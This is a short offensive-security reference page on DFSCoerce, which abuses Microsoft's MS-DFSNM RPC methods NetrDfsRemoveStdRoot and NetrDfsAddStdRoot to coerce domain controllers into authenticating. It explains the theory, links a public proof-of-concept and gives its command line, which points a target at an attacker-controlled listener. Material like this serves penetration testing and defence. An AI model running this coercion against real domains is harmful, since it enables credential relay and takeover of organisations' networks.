---
authors: ShutdownRepo
category: ad
---

# MS-DFSNM abuse (DFSCoerce)

## Theory

MS-DFSNM is Microsoft's Distributed File System Namespace Management protocol. It provides an RPC interface for administering DFS configurations ([docs.microsoft.com](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979)) and is available as an RPC interface. That interface is available through the `\pipe\netdfs` SMB named pipe.

In mid-2022, [Filip Dragovic](https://twitter.com/filip_dragovic) demonstrated the possibility of abusing the protocol to coerce authentications. Similarly to other MS-RPC abuses, this works by using a specific method relying on remote address. In this case (as of July 6th, 2022), the following methods were detected vulnerable: `NetrDfsRemoveStdRoot` and `NetrDfsAddStdRoot`. It is worth noting this coercion method only works against domain controllers.

## Practice

The following Python proof-of-concept ([https://github.com/Wh04m1001/DFSCoerce](https://github.com/Wh04m1001/DFSCoerce)) implements the `NetrDfsRemoveStdRoot` and `NetrDfsAddStdRoot` methods.

```bash
dfscoerce.py -d "domain" -u "user" -p "password" LISTENER TARGET
```

## Resources

[https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979)

[https://github.com/Wh04m1001/DFSCoerce](https://github.com/Wh04m1001/DFSCoerce)